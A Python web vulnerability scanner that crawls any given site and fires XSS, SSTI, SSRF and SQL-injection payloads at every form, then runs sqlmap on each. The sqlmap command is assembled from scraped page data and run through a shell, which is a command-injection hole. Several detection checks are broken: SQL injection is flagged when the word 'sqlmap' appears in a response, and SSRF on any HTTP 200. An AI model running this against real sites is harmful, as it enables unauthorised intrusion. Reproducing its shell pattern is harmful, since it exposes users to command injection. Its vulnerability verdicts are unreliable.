import requests
from bs4 import BeautifulSoup
import subprocess
import argparse
import urllib.parse as urlparse

# ASCII art banner
BANNER = """
@@@  @@@   @@@@@@   @@@@@@@@@@   @@@@@@@@  @@@  @@@  @@@  @@@@@@@   @@@@@@@@   @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@   
@@@  @@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@  @@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@@  @@! @@! @@!  @@!       @@!  @@!  @@!  @@!  @@@  @@!       !@@       @@!  !@@  @@!       @@!  @@@  
!@!  @!@  !@!  @!@  !@! !@! !@!  !@!       !@!  !@!  !@!  !@!  @!@  !@!       !@!       !@!  @!!  !@!       !@!  @!@  
@!@!@!@!  @!@  !@!  @!! !!@ @!@  @!!!:!    @!!  !!@  @!@  @!@!!@!   @!!!:!    !@!       @!@@!@!   @!!!:!    @!@!!@!   
!!!@!!!!  !@!  !!!  !@!   ! !@!  !!!!!:    !@!  !!!  !@!  !!@!@!    !!!!!:    !!!       !!@!!!    !!!!!:    !!@!@!    
!!:  !!!  !!:  !!!  !!:     !!:  !!:       !!:  !!:  !!:  !!: :!!   !!:       :!!       !!: :!!   !!:       !!: :!!   
:!:  !:!  :!:  !:!  :!:     :!:  :!:       :!:  :!:  :!:  :!:  !:!  :!:       :!:       :!:  !:!  :!:       :!:  !:!  
::   :::  ::::: ::  :::     ::    :: ::::   :::: :: :::   ::   :::   :: ::::   ::: :::   ::  :::   :: ::::  ::   :::  
 :   : :   : :  :    :      :    : :: ::     :: :  : :     :   : :  : :: ::    :: :: :   :   :::  : :: ::    :   : :  
Created by therealslimshady
https://github.com/therealslimshady0
https://x.com/dare4lslimshady
 """

# Set to avoid visiting the same page multiple times
visited = set()

# Function to scrape the website
def scrape_website(base_url, url):
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an error for bad status codes
    except requests.exceptions.RequestException as e:
        print(f"Error accessing {url}: {e}")
        return

    print(f"Scraping {url}")
    visited.add(url)
    soup = BeautifulSoup(response.content, 'html.parser')

    # Find and process forms on the page
    forms = soup.find_all('form')
    for form in forms:
        form_action = form.get('action')
        form_method = form.get('method', 'get').lower()
        inputs = form.find_all('input')
        form_details = {
            'action': form_action,
            'method': form_method,
            'inputs': [{'name': inp.get('name'), 'type': inp.get('type', 'text')} for inp in inputs]
        }
        test_form(base_url, url, form_details)

    # Find and process links on the page
    for link in soup.find_all('a'):
        href = link.get('href')
        if href:
            new_url = urlparse.urljoin(base_url, href)
            if new_url.startswith(base_url) and new_url not in visited:
                scrape_website(base_url, new_url)

# Function to test forms for vulnerabilities
def test_form(base_url, page_url, form_details):
    target_url = urlparse.urljoin(base_url, form_details['action']) if form_details['action'] else page_url

    print(f"Testing form at {target_url}")

    data = {inp['name']: 'test' for inp in form_details['inputs'] if inp['name']}
    
    # Payloads for vulnerability tests
    xss_payload = "<script>alert('XSS')</script>"
    ssti_payload = "{{7*7}}"
    ssrf_payload = "http://127.0.0.1:80"
    sql_payload = "1' OR '1'='1"  # Simple SQL payload to avoid disruption

    for input_field in form_details['inputs']:
        if input_field['name']:
            print()
            # Test for XSS
            test_payload(base_url, target_url, form_details, input_field, xss_payload, 'XSS')
            # Test for SSTI
            test_payload(base_url, target_url, form_details, input_field, ssti_payload, 'SSTI')
            # Test for SSRF
            test_payload(base_url, target_url, form_details, input_field, ssrf_payload, 'SSRF')
            # Test for SQL Injection
            test_payload(base_url, target_url, form_details, input_field, sql_payload, 'SQL Injection')

    # Test for SQL Injection
    if form_details['method'] == 'post':
        sqlmap_command = f"sqlmap -u {target_url} --data=\"{data}\" --batch --forms"
    else:
        params = '&'.join([f"{inp['name']}=test" for inp in form_details['inputs'] if inp['name']])
        sqlmap_command = f"sqlmap -u {target_url}?{params} --batch --forms"

    print(f"Running SQLi test: {sqlmap_command}")
    try:
        result = subprocess.run(sqlmap_command, shell=True, capture_output=True, text=True)
        output = f"SQL Injection: {result.stdout.strip() if result.stdout else result.stderr.strip()}"
    except Exception as e:
        output = f"Error running SQLi test: {e}"

    print(output)

def test_payload(base_url, target_url, form_details, input_field, payload, vuln_type):
    data = {inp['name']: 'test' for inp in form_details['inputs'] if inp['name']}
    data[input_field['name']] = payload

    try:
        if form_details['method'] == 'post':
            response = requests.post(target_url, data=data)
        else:
            params = {input_field['name']: payload}
            response = requests.get(target_url, params=params)

        if vuln_type == 'XSS' and payload in response.text:
            print(f"XSS Payload: {payload} appears vulnerable at {target_url} in field {input_field['name']}")
        elif vuln_type == 'SSTI' and "49" in response.text:
            print(f"SSTI Payload: {payload} appears vulnerable at {target_url} in field {input_field['name']}")
        elif vuln_type == 'SSRF' and response.status_code == 200:
            print(f"SSRF Payload: {payload} appears vulnerable at {target_url} in field {input_field['name']}")
        elif vuln_type == 'SQL Injection' and "sqlmap" in response.text:
            print(f"SQL Payload: {payload} appears vulnerable at {target_url} in field {input_field['name']}")
        else:
            print(f"{vuln_type} Payload: {payload} does not appear vulnerable at {target_url} in field {input_field['name']}")

    except Exception as e:
        print(f"Error testing form for {vuln_type}: {e}")

# Main function to handle command-line arguments and start the process
def main():
    parser = argparse.ArgumentParser(description='Security testing tool for websites')
    parser.add_argument('-u', '--url', required=True, help='Base URL of the website to test')
    args = parser.parse_args()
    base_url = args.url

    # Ensure the URL has a scheme
    if not urlparse.urlparse(base_url).scheme:
        base_url = 'http://' + base_url

    print(BANNER)
    scrape_website(base_url, base_url)

if __name__ == "__main__":
    main()
